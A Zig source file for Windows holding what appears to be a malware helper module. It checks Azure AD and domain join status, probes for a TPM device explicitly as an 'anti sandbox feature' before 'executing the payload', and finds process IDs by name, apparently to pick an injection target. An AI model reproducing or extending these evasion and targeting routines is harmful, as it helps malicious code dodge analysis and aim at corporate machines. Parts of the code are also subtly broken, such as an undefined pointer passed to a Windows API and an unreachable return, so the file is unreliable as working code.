const std = @import("std");
const hlp32 = @import("zigwin32").everything;
const windows = std.os.windows;
const WINAPI = windows.WINAPI;
const HANDLE = windows.HANDLE;
const DWORD = windows.DWORD;
const BOOL = windows.BOOL;
const isDebug = windows.BOOL;

pub extern "kernel32" fn CreateFileA(
    lpFileName: ?[*:0]const u8,
    dwDesiredAccess: u32,
    dwShareMode: u32,
    lpSecurityAttributes: ?*anyopaque,
    dwCreationDisposition: u32,
    dwFlagsAndAttributes: u32,
    hTemplateFile: ?HANDLE,
) callconv(@import("std").os.windows.WINAPI) ?HANDLE;

const NETSETUP_JOIN_STATUS = enum(c_int) {
    NetSetupUnknownStatus = 0,
    NetSetupUnjoined = 1,
    NetSetupWorkgroupName = 2,
    NetSetupDomainName = 3,
};

pub extern "netapi32" fn NetGetJoinInformation(
    lpServer: ?[*:0]const u16,
    lpNameBuffer: *[*:0]u16,
    BufferType: *NETSETUP_JOIN_STATUS,
) callconv(WINAPI) windows.DWORD;

pub const PROCESSENTRY32W = extern struct {
    dwSize: u32,
    cntUsage: u32,
    th32ProcessID: u32,
    th32DefaultHeapID: usize,
    th32ModuleID: u32,
    cntThreads: u32,
    th32ParentProcessID: u32,
    pcPriClassBase: i32,
    dwFlags: u32,
    szExeFile: [260]u16,
};

pub const PROCESSENTRY32 = extern struct {
    dwSize: u32,
    cntUsage: u32,
    th32ProcessID: u32,
    th32DefaultHeapID: usize,
    th32ModuleID: u32,
    cntThreads: u32,
    th32ParentProcessID: u32,
    pcPriClassBase: i32,
    dwFlags: u32,
    szExeFile: [260]windows.CHAR,
};

pub extern "kernel32" fn Process32FirstW(
    hSnapshot: HANDLE,
    lppe: *PROCESSENTRY32W,
) callconv(WINAPI) BOOL;

pub extern "kernel32" fn Process32NextW(
    hSnapshot: HANDLE,
    lppe: *PROCESSENTRY32W,
) callconv(WINAPI) BOOL;

// TPM-related constants
const TPM_INVALID_HANDLE = @as(HANDLE, @ptrFromInt(0xffffffff));
const GENERIC_READ = 0x80000000;
const GENERIC_WRITE = 0x40000000;
const FILE_SHARE_READ = 0x00000001;
const FILE_SHARE_WRITE = 0x00000002;
const OPEN_EXISTING = 3;
const ERROR_SUCCESS = @as(windows.DWORD, 0);
const NERR_Success = @as(windows.DWORD, 0);

const L = std.unicode.utf8ToUtf16LeStringLiteral; //UTF-16LE string literal is cooler than UTF-8

pub fn checkAzureADJoin() bool {
    const registry_paths = [_][:0]const u16{
        L("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WorkplaceJoin"),
        L("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AAD\\Storage"),
        L("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Identity\\Provider\\AADWAM"),
        L("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AAD"),
    };
    for (registry_paths) |path| {
        var key_handle: windows.HKEY = undefined;
        // var path_buffer: [*:0]const u16 = undefined;
        // _ = std.unicode.utf8ToUtf16Le(path_buffer, path) catch continue;
        const result = windows.advapi32.RegOpenKeyExW(
            windows.HKEY_CURRENT_USER,

            path,
            0,
            windows.KEY_READ,
            &key_handle,
        );
        if (result == ERROR_SUCCESS) {
            _ = windows.advapi32.RegCloseKey(key_handle);
            std.debug.print("Azure AD join detected via user profile\n", .{});
            return true;
        }
    }
    return false;
}
//pub fn checkDomainStatus() bool {
//   // Check user environment variables first
//  if (std.process.getEnvVarOwned(std.heap.page_allocator, "USERDOMAIN")) |domain| {
//     defer std.heap.page_allocator.free(domain);
//    // Check if not in WORKGROUP
//   if (!std.mem.eql(u8, domain, "WORKGROUP")) {
//      std.debug.print("Domain detected: {s}\n", .{domain});
//     return true;
//}
// } else |_| {}

//  return checkAzureADJoin(); // fall
//}

pub fn checkDomainStatus() bool {
    const lpNameBuffer: *[*:0]u16 = undefined;
    var njs: NETSETUP_JOIN_STATUS = undefined;

    const status = NetGetJoinInformation(null, lpNameBuffer, &njs);

    if (status == NERR_Success) {
        std.debug.print("Domain joined: {s}\n", .{lpNameBuffer});
        return true;
    } else {
        std.debug.print("Not domain joined\n", .{});
        return false;
    }

    return checkAzureADJoin();
    // return checkDomainStatus() or checkAzureADJoin();
}
// anti sandbox feature.
pub fn checkTPMPresence() bool {

    // https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file#win32-device-namespaces
    const tpm_device = "\\\\.\\TPM".*;

    const h_device = CreateFileA(
        &tpm_device,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        null,
        OPEN_EXISTING,
        0,
        null,
    );

    if (h_device == TPM_INVALID_HANDLE) {
        // std.debug.print("TPM device not found - possible sandbox environment\n", .{}); // this likely a sandbox
        return false;
    }

    defer {
        _ = windows.CloseHandle(h_device.?);
    }

    // std.debug.print("TPM device found - likely real hardware\n", .{}); // alright found! then continue executing the payload
    return true;
}
pub fn GetRemoteProcessId(process_name: []const u16) anyerror!windows.DWORD {
    //var hProcess: HANDLE = undefined;
    //var snapshot_handle: HANDLE = undefined;
    var process_entry: PROCESSENTRY32W = undefined;

    const snapshot_handle = windows.kernel32.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0);

    // if (snapshot_handle == windows.INVALID_HANDLE_VALUE) {
    //     return 0;
    //  }
    //{
    defer _ = windows.CloseHandle(snapshot_handle);
    //  }
    process_entry.dwSize = @sizeOf(PROCESSENTRY32W);

    var is_ok = Process32FirstW(snapshot_handle, &process_entry);

    if (is_ok == windows.FALSE) {
        return error.ProcessNotFound;
    }

    while (is_ok == windows.TRUE) : (is_ok = Process32NextW(snapshot_handle, &process_entry)) {
        if (std.mem.eql(u16, process_name, process_entry.szExeFile[0..process_name.len])) {
            return process_entry.th32ProcessID;
        }
    }

    return error.ProcessNotFound;

    //  while (Process32NextW(snapshot_handle, &process_entry) == windows.TRUE) {
    //      if (std.mem.eql(u16, process_entry.szExeFile[0..process_name.len])) {
    //         return process_entry.th32ProcessID;
    //     }
    // }
    //return 0;
}

//     if (!checkTPMPresence()) {
//         std.debug.print("Possible sandbox detected - terminating\n", .{});
//         return;
// }
